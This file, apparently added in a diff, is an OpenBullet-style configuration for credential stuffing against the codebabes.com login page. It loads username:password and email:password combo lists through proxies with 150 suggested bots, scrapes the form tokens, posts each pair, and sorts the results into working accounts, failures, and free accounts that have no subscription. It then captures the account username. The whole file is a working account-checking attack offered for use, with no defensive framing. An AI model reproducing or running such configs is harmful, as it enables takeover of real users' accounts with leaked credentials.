@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "codebabes",
+  "SuggestedBots": 150,
+  "LastModified": "2018-05-30T21:07:26.1867198+00:00",
+  "AdditionalInfo": "All accounts with no sub go to free",
+  "Author": "DivineGhostMa",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_main_page REQUEST GET "https://codebabes.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#GET_LOGIN_PAGE REQUEST GET "https://codebabes.com/user/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_FORM_BUILD_ID PARSE "<SOURCE>" CSS "[name=form_build_id]" "value" 0 -> VAR "FORM_BUILD_ID" "" "" 
+#PARSE_FORM_ID PARSE "<SOURCE>" CSS "[name=form_id]" "value" 0 -> VAR "FORM_ID" "" "" 
+#PARSE_OP PARSE "<SOURCE>" CSS "[name=op]" "value" 0 -> VAR "OP" "" "" 
+#POST_LOGIN REQUEST POST "https://codebabes.com/user/login/user/login" AutoRedirect=TRUE 
+  CONTENT "name=<USER>&pass=<PASS>&form_build_id=<FORM_BUILD_ID>&form_id=<FORM_ID>&op=<OP>&op=<OP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, unrecognized username or password." 
+  KEYCHAIN Success OR 
+    KEY "</i>Log out</a></li>" 
+    KEY "</i>My Account</a></li>" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "subscribe\"><i class=\"fa fa-credit-card\" aria-hidden=\"true\"></i><span class=\"tab\">Subscribe</span></a></li>" 
+#Capture_Username PARSE "<SOURCE>" LR "        <h2 class=\"pane-title\">" "</h2>" Recursive=FALSE -> CAP "UserName" "" "" 
